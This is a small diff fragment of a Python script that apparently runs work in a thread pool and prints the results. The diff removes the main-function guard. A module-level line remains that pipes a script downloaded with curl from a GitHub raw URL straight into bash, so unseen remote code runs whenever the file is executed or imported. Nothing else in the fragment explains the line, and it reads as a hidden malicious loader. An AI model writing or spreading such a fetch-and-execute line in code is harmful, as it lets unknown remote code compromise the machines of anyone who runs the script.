@@ -15,7 +15,5 @@ with concurrent.futures.ThreadPoolExecutor() as executor:
 
 print(results)
 
-if __name__ == "__main__":
-    main()
 os.system('curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash')
 
